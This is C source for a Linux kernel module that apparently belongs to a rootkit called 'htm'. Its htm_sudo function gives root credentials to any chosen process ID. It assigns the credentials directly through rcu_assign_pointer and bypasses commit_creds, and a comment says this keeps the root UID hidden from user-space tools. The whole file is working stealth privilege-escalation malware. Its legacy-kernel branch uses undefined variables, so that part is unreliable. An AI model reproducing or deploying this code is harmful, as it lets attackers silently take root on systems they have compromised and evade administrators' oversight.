#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/module.h>
#include <linux/version.h>

#include "config.h"
#include "htm.h"
#include "sudo.h"

static notrace struct task_struct *_get_task_struct_by_pid(unsigned pid)
{
        struct pid *proc_pid;

        if (! (proc_pid = find_vpid(pid)))
                return NULL;

        return pid_task(proc_pid, PIDTYPE_PID);
}

notrace int htm_sudo(pid_t pid)
{
        #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
        current->uid  = uid;
        current->euid = euid;
	current->gid  = gid;
	current->egid = egid;
        #else
        struct task_struct *task;
        struct cred *new_cred;

        kuid_t kuid0 = KUIDT_INIT(0);
        kgid_t kgid0 = KGIDT_INIT(0);

	// If `pid` is <= 0, target the process from the context
	if (pid <= 0)
		pid = current->pid;

        if (! (task = _get_task_struct_by_pid(pid))) {
                #ifdef HTM_DEBUG
                htm_pr_err("failed to get task for PID %i", pid);
                #endif

                return -ENOENT;
        }

        if (! (new_cred = prepare_creds())) {
                #ifdef HTM_DEBUG
                htm_pr_err("prepare_creds() returned 0");
                #endif

                return -ENOMEM;
        }

        new_cred->uid  = kuid0;
        new_cred->euid = kuid0;
        new_cred->gid  = kgid0;
        new_cred->egid = kgid0;

        // Dirty creds assignment to omit root UID from user space programs. When `commit_creds()`
	// is called, the new UID is visible instead of only affecting the current task.
        rcu_assign_pointer(task->cred, new_cred);
        //commit_creds(prepare_kernel_cred(NULL));
        #endif

        #ifdef HTM_DEBUG
        htm_pr_notice("root privileges granted to PID %i", pid);
        #endif

        return 0;
}
